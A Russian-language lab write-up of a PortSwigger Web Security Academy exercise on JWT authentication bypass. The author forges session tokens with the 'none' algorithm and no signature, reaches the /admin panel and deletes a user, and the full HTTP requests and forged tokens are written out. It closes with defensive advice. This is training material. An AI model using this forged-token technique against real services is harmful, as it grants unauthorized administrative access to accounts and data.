лаба
https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification

в этой лабе механизм на основе JWT для обработки сеансов.
Сервер небезопасно настроен для приема неподписанных JWT

задание:
изменить свой токен сеанса, 
получить доступ к панели администратора по адресу `/admin`, 
удалить пользователя `carlos`

-----


вот запрос к странице своего аккаунта

```http
GET /my-account?id=wiener HTTP/2
Host: 0a9a008103103d8480edcbc4009400ef.web-security-academy.net
Cookie: session=eyJraWQiOiI1YmQ5Y2IxNi0wODcwLTRjNGItOTdmYS01NjBkYTJmOWI4MWQiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjU0NzA0Miwic3ViIjoid2llbmVyIn0.gHkP9M1nVlxa6yGmjdXpY3PFDtwMwUuKCrTLTG-4_M96_ywM7jMK7nHOY2TSw8T9t56LzJb8Aei_1IZESB3UPux3UDOI3RfFqvn1SwWy_5BDmlojStM5IgN8gySIehGm33UF5W18gupkEkI72mWiJQFdz30wBdpBBCg83qXmu75hKQ-jaJSclB4jTiRYxLzEJLymKeXul2ngdIK_HF34oGQuSePEJnp8iygObOI-cyhP8eboBDJhUu9WbfR8gZ2UUJzZruMfxqLZRl5EuZcHVTm_2PvvuPgOXEoT7nV9zhTGkwmYhvQgML1kkrMa9iryxZ9EOoiT8L9Ihnjqug4e4A
Cache-Control: max-age=0
```

разбираю json куку

```json

{"kid":"5bd9cb16-0870-4c4b-97fa-560da2f9b81d","alg":"RS256"}

.

{"iss":"portswigger","exp":1772547042,"sub":"wiener"}

.

подпись

gHkP9M1nVlxa6yGmjdXpY3PFDtwMwUuKCrTLTG-4_M96_ywM7jMK7nHOY2TSw8T9t56LzJb8Aei_1IZESB3UPux3UDOI3RfFqvn1SwWy_5BDmlojStM5IgN8gySIehGm33UF5W18gupkEkI72mWiJQFdz30wBdpBBCg83qXmu75hKQ-jaJSclB4jTiRYxLzEJLymKeXul2ngdIK_HF34oGQuSePEJnp8iygObOI-cyhP8eboBDJhUu9WbfR8gZ2UUJzZruMfxqLZRl5EuZcHVTm_2PvvuPgOXEoT7nV9zhTGkwmYhvQgML1kkrMa9iryxZ9EOoiT8L9Ihnjqug4e4A
```


-----

попробовал подменить пейлоад
на 
```json
{  
    "iss": "portswigger",  
    "exp": 1772547042,  
    "sub": "administrator"  
}
```
но не получилось

-----

попробую подменить хедер
на 
```json
{ "alg": "HS256", "typ": "JWT" }
```

ни то ни это не сработало - видимо - подпись проверяется!!!

-----

может тут нужно вообще как -то заставить не проверять ее?

например так  `"alg": "none"`

пробую 

```json
{ "alg": "none" }
```

я сделал так (постаивл в хедере  "alg": "none" и убрал подпись вообще)
и смог получить снвоа доступ к своему же аккаунту wiener! то есть теперь можно прописать в хедере и пейлоаде все что захочу - и это будет валидно!


<img src="../../assets/4456353r2026-03-0318.48.19.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />



сам запрос выот так выглядит 
```http
GET /my-account?id=wiener HTTP/2
Host: 0a7000dd0487483781ce2a06007b00ce.web-security-academy.net
Cookie: session=eyJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjU0ODg1Niwic3ViIjoid2llbmVyIn0.
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
......
...
..
.
```

-----

теперь просто подменю путь  на  /admin
и пейлоад на
```json
{"iss":"portswigger","exp":1772548856,"sub":"administrator"}
```

<img src="../../assets/2026-03-0318.52.47.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />



но ответ все -равно 401  Unauthorized

пробовал пейлоад вообще удалить - но все равно 401!

---

нужно вернуть kid который я убрал

вот так сделать
```json
{"kid":"5bd9cb16-0870-4c4b-97fa-560da2f9b81d","alg":"none"}
```

<img src="../../assets/6466464646462026-03-0319.14.30.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />



запрос отправляю
```http
GET /admin HTTP/2
Host: 0a7000dd0487483781ce2a06007b00ce.web-security-academy.net
Cookie: session=eyJraWQiOiJmYjhlYmNlNy00M2I0LTQxNTItYTBkOC1mOTMwYzRjYjkyYTUiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjU0ODg1Niwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.ucnkmgT8F8OXYHkWTrkRN_tlJHej93b5G2-5NBl47XDsTzQXlHWzZrU8yUmafxNIaFZpR39G04pZKXMfWISM97BsN4avztr2R___FLepLVTKr0S1zmfQ6xAOsVrW1T4TqfwF-Bb9ntMG2kTZfzgfhakaqUeFmzPe5ytkIGfmWb_aHfoOtOhl4ToxbJy6BrHBludbqAmhmuMPQwtV85r-02Dwn9z3R1Thli4WxYBm7AHvfamsZb-3DBbMpLMGj3GpiwEpiscRx8q0EabyFHhA-u1ZvS1Zbhh8K_6JAAQZuYvUCid7_sPLswSTl-1te0dC-Yn9Izvy3mNTfTlrnZst2Q
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "N
```

ответ 401


удалил подпись 
И ОБЯЗАТЕЛЬНО ТОЧКУ В КОНЦЕ ОСТАВИЛ
```http
GET /admin HTTP/2
Host: 0a7000dd0487483781ce2a06007b00ce.web-security-academy.net
Cookie: session=eyJraWQiOiJmYjhlYmNlNy00M2I0LTQxNTItYTBkOC1mOTMwYzRjYjkyYTUiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjU0ODg1Niwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
Cache-Control: max-age=0
```

и попал в админку

!!!!!

отлично!!

вот ручки удаления юзеров
```html
wiener - </span>
                            <a href="/admin/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
```

удаляю карлоса

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0a7000dd0487483781ce2a06007b00ce.web-security-academy.net
Cookie: session=eyJraWQiOiJmYjhlYmNlNy00M2I0LTQxNTItYTBkOC1mOTMwYzRjYjkyYTUiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjU0ODg1Niwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
Cache-Control: max-age=0
```

#### и лаба решена!

## выводы! 

лаба показала самую тупую и опасную ошибку в реализации JWT — сервер принимает токены с алгоритмом none , то есть я могу так оправлять любые хедеры и пейлоады!

просто убрал подпись и поменял sub на administrator 

ключевой момент: kid нужно было оставить на месте — сервер мог проверять его наличие даже при отключённой подписи

ещё один важный нюанс — после удаления подписи обязательно оставлять точку в конце, иначе сервер ломается

никакого взлома криптографии, никаких ключей — просто доверие к заголовку, который говорит «я без подписи, но ты всё равно верь мне»

#### защита  

никогда не включать поддержку alg none в production

если библиотека позволяет такие токены — отключать на уровне конфига

лучше вообще не использовать параметр alg как указание на алгоритм, а жёстко задавать его на сервере

если вдруг нужна совместимость — проверять, что alg приходит только из белого списка и none там нет

и всегда следить за обновлениями библиотек — в старых версиях эта дыра была в каждом втором фреймворке


